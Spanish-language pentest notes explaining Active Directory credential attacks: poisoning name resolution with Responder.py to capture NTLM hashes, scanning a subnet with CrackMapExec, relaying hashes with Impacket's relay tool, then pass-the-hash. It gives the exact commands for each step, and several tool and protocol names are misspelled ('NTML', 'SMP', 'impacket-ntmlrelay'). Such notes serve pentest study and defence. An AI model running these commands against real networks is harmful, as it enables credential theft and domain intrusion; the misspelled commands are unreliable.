** Responder.py **
Responder sirve para interceptar credenciales a nivel de red que los equipos usan para autenticarse en el dominio de Active Directory.
Cuando una máquina intenta acceder a un recurso compartido a nivel de red que no existe, por ejemplo en el navegador del equipo objetivo: `\\<own_ip>\loquesea` . Hará una petición a toda la red pidiendo si algún otro equipo contiene ese recurso. Ahí es cuando actua el servidor Responder, respondiendo síempre afirmativamente a que tiene cualquier recurso, por lo tanto el equipo objetivo se autenticará con su hash identificativo del dominio contra el Responder, el cual podrá obtener el hash NTML del usuario que está realizando la acción. 
>Ejecución del responder
>`python responder.py -I tun0 -r -d -w`

** NTML-Relay **
Herramienta automatizada dentro del repositorio de "Impacket" que creará conexiones mediante diferentes protocolos a los equipos de una red. Estas conexiones permitirán obtener los hashes NTML. Para ello deberemos tener un servidor Responder activo para capturar los hashes cuando alguno de los equipos intente acceder a algún recurso que no exista y nuestro servidor sí sea capaz de responder.
Ejecución de NTML-Relay
>Modificar el fichero Responder.conf en la máquina local para deshabilitar SMP y HTTP, dejando que sólo realicemos la autenticación mediante SMB.
>Levantamos el Responder de manera local.
>`python responder.py -I tun0 -r -d -w`
>Vemos qué equipo hay en la red con CrackMapExec
>`cme smb 192.168.1.0/24`
>Copiamos las direcciones obtenidas en una archivo targets.txt
>Lanzamos el ataque NTML-Relay
>`impacket-ntmlrelay -tf targets.txt -smb2support`

Cuando algún equipo intente acceder a algún recurso que no exista, obtendremos un hash NTML, con el cual seguramente podremos hacer pass-the-hash con CrackMapExec o pth-winexe.
